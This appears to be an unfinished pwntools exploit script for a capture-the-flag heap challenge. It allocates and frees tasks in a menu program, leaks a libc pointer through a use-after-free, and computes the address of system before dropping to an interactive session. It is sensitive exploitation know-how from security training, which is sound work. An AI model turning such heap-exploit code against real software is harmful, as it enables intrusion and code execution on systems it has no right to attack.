import pwn

port = 1337
host = "406725ba9bee5ffe6db60ced-1024-intro-heap-1.challenge.cscg.live"
host = "d17854a19c49b202b95e5e0c-1024-intro-heap-1.challenge.cscg.live"
#p = pwn.remote(host,port,ssl=True)
#host = "localhost"
#port = 1024
#p = pwn.remote(host,port)
p = pwn.process("main")

tasks = []
def add_task(content) -> id:
    p.sendlineafter(b"choice? ",b"1")
    p.sendlineafter(b"name? ",content)
    tasks.append(content)
    return len(tasks)-1

def free_task(_id):
    p.sendlineafter(b"choice? ",b'2')
    p.sendlineafter(b"id? ",_id)

def print_list():
    p.sendlineafter(b"choice? ",b'3')
    list_ = []
    for i in range(len(tasks)):
        tmp = p.recvline().split(b"] ")[1][:-1]
        list_.append(tmp)
    return list_



def main():
    for i in range(9):
        add_task(f"{i}".encode())
    input()
    for i in range(8):
        free_task(f"{i}".encode())
    input()
    libc_address = print_list()[7]
    libc_address = pwn.u64(libc_address.ljust(8,b'\x00'))
    print(hex(libc_address))
    system_address = libc_address - 0x1c8f80
    print("system",system_address)
    p.interactive()
    input()
    free_task(b'0')
    add_task(b"last")
if __name__ == "__main__":
    main()
    input()
